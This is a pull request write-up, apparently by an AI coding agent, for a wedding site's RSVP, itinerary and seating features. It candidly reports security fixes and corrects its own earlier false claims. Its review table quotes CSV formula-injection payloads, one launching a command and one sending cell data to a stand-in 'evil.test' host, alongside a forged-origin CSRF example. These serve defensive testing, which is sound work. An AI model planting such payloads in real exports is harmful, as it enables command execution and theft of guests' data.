# PR 07 — RSVP, Your Weekend, seating

Level **07** of 17. Base: `main` (level 06 merged as `701e05c`).

## 1. Hostile-reviewer pass

*What is the worst thing a reviewer could say about this diff?*

**"Your security suites never ran, and you shipped a CSRF hole behind them."** Correct, and it is
the finding of this level. `tests/security/**` — five suites covering IDOR, OTP enumeration and
brute force, invitation replay and revoke, session fixation and CSRF — had never executed in CI:
the e2e job filtered to `tests/e2e`. They existed, they passed on their author's machine, and the
level-06 PR body cited them as evidence. Standing up a server they could actually run against
surfaced a real defect in the first attempt: `POST /api/auth/sign-out` accepted any origin, so any
site could force a signed-in guest out. Fixed at the route; the suites now run in CI; and a build
guard makes "a spec that no step runs" a failing build rather than a silent gap.

**"You verified in configurations that could not fail."** Also fair, twice on this branch before I
caught the pattern. Recorded in §4 rather than smoothed over.

**"This level is large."** 91 files. It is one coherent surface (events, RSVP, Your Weekend,
seating) plus the integration work to put it on the real identity schema, and it is the level the
brief asks for before travel and media can mean anything.

## 1b. Correction to the level-06 self-review

The level-06 self-review states that the remaining `localhost:3NNN` literals were "unit and
integration tests building synthetic `Request` objects … self-consistent and carry no port
dependency." **That was wrong.** I ran `grep | head -20` over 26 matches and generalised from the
visible ones. Four of the six I did not look at were in `tests/security/*.spec.ts` — real-server
specs carrying the identical hardcoded-origin defect I had just fixed in the passkey journey.

The worst of them was the CSRF test's positive control:

```ts
cap(..., { cookie, origin: 'https://evil.example' })    // expect 401 — passes on any port
cap(..., { cookie, origin: 'http://localhost:3106' })   // expect 200 — only on port 3106
```

On any other port the second call also returned 401, so the test passed while no longer
distinguishing a working CSRF check from a site that rejects everything. All four now resolve the
origin the way `playwright.config.ts` does; no hardcoded port remains in any real-server spec.

## 2. Authorization table

| Capability | Kind | Auth + entitlement | IDOR test | Result |
|---|---|---|---|---|
| `list_my_events` | read | guest · `view_event` | `tests/integration/rsvp.test.ts` scope-to-`actsFor` | pass |
| `get_my_rsvp` | read | guest · `rsvp_self` | cross-household read refused; entitled admin refused by the handler guard | pass |
| `draft_rsvp` | draft | guest · `rsvp_self` | attendee injection from another household refused | pass |
| `submit_rsvp` | transaction | guest · `rsvp_self` · UI-only | confirmation token bound to principal + payload + surface | pass |
| `get_my_itinerary` | read | guest · `view_private_schedule` | entitled admin refused by the handler guard | pass |
| `get_my_table` / `show_my_table_on_floorplan` | read | guest · `view_table_assignment` | unpublished chart invisible; `assertActsFor` on the one input naming a guest | pass |
| 17 × `admin_*` | read/action | admin · `admin_content` and/or `admin_guest_ops` | `admin_list_events` moved to require `admin_guest_ops` (§5) | pass |

The per-role capability snapshot (`tests/integration/identity/resolver.test.ts`) moves 18 → 23 guest
and 17 → 34 admin. Updated deliberately, each addition checked: every new guest capability is
`auth: 'guest'` behind an entitlement, and **the anonymous list is unchanged** — this level exposes
nothing publicly. Two absences are the entitlement gate working rather than omissions, and the
reasoning is recorded beside the assertion for the next level.

## 3. Secrets and PII grep

`guest_needs` (dietary and accessibility free text) is the sensitive data here. It stays out of
logs, audit metadata, idempotency responses, the confirmation e-mail body, and every non-`ui`
surface. `draft_rsvp` used to echo it back on the `ai`/`webmcp` surfaces; it no longer does,
matching `get_my_rsvp`, and its confirmation token is unredeemable off the website anyway. `.env`
untouched. No new secret material.

## 4. Tests — and two I proved were not testing what they claimed

Unit 242, integration 100, e2e/security 215 across two arrangements. Additions:

- **CSV formula injection** (`tests/unit/rsvp/csv-export.test.ts`) with the exact payloads I
  measured reaching the planner's download raw. Fails 7 of 8 without the guard.
- **Seating capacity under concurrency** — exactly one of two simultaneous saves takes the last
  seat. Without the in-transaction check both succeed and overfill the table.
- **Pipeline rate limit** — the budget is refused once spent, and absent for in-process callers.
  Fails without the consume in `invoke`.
- **Test-principal gate** — disabled outside `NODE_ENV=test`, without a secret, with a short
  secret, on a wrong secret, on a missing header, on unparseable JSON. The positive case genuinely
  injects; my first version used a non-ULID id, which made it fail and would have left every
  negative passing for the wrong reason.

**Two existing tests did not exercise their guard.** `tests/integration/weekend.test.ts:69` and
`tests/integration/rsvp.test.ts:185` refused an admin who lacked the entitlement, so `authorize()`
rejected first and the handlers' own `requireGuestPrincipal` never ran. I verified this by deleting
both guards: all five tests still passed. The admins are now entitled, so the guard is what is under
test — with the guards deleted, both tests now fail. That guard is the only thing stopping an
owner-role admin who *does* hold `view_private_schedule` from reading a household's private
itinerary.

**Deliberately not covered:** cross-browser (Chromium only, as configured); the tablet viewport for
the RSVP journey (skipped by the spec's own guard, phone and desktop are the review viewports).

## 5. Independent security review, and what I re-measured

An adversarial reviewer read this level's diff. One blocker, eight should-fixes. I re-verified each
finding with my own probes rather than accepting the report:

| Finding | Verified how | Status |
|---|---|---|
| **Blocker** — CSV formula injection: guest-written `dietary`, `accessibility`, plus-one name reach the planner's CSV with a leading `=`/`+`/`-`/`@` | Ran the real `needsToCsv`: `=cmd\|'/c calc'!A1` arrived raw; `=HYPERLINK("https://evil.test/?d="&A2,"Menu")` survived quoting, because Excel strips CSV quotes before deciding a cell is a formula | fixed + regression test |
| `admin_list_events` returns the whole roster behind `admin_content` alone | Read the descriptor and output; the branch's own test defines the content-only planner persona it breaks | requires `admin_guest_ops` |
| CSV export route leaked entitlement names the JSON route strips | Read both error paths | stripped |
| Weekend slot `href` unvalidated into `<a href>` | Read the schema and the component | constrained to relative or `https` |
| `draft_rsvp` echoed needs text to assistants | Read the output construction; confirmed the token is unredeemable off `ui` | trimmed off-`ui` |
| Server actions bypass the rate limiter | Read `uiContext` → `createCapabilityContext`; no limiter wired | budget moved into `invoke` |
| Unbounded CSV table names | Read `parseSeatingCsv` against `admin_upsert_table`'s cap | capped to match |
| Two admin read-then-write races | Read both call sites | both folded into their transactions |
| Two tests that pass without their guard | Deleted the guards; tests still passed | fixed, re-proved |

Not accepted as a code change: **tablemate names cross household lines by design** — a guest sees
who else is at their table. That is what the descriptor advertises and what a seating chart is, but
it is the one place a guest learns another household's placement, so it belongs to Tyler and Sara as
a product decision, not to me. Raised in the content backlog rather than silently changed.

## 6. Design verdict per theme

Deferred to the design-review round on the two new guest surfaces (`/rsvp`, `/your-weekend`) in both
themes; not claimed here.

## 7. Accessibility and performance

`/rsvp` and `/your-weekend` are audited with axe **with a real session**, at phone and desktop
widths, and mid-journey rather than only on load (`tests/e2e/rsvp.spec.ts`). The public `a11y.spec.ts`
route list deliberately does **not** include them: they are guest-gated as of level 06, so an
anonymous visit redirects to `/sign-in` and axe would audit the sign-in page under a test named for
the RSVP page. Inputs are asserted labelled and ≥17px so phones do not zoom.

## 8. Docs and ADRs

`docs/architecture/` gains this level's notes from the swarm. The stale "contract change requested
from Swarm D" comment in `src/domain/rsvp/email.ts` is corrected: level 06 delivered `sendMessage`,
so both shipped providers can now send, and the degraded path is kept for a provider seam that
cannot.

## 9. TODO inventory

Unchanged in kind: event names, descriptions and the RSVP deadline remain `TODO(Tyler & Sara)`
placeholders with `placeholder: true`. No invented wedding facts. The content backlog gains the
tablemate-visibility question.

## 10. Verdict

**READY**, with the design review on the two new guest surfaces still to run before merge.

`npm run verify` green in its log; both CI arrangements verified locally before pushing rather than
discovered in CI. The migration was regenerated from the merged schema (`0004`), creates no identity
tables, and its six foreign keys point at level 06's real ones.
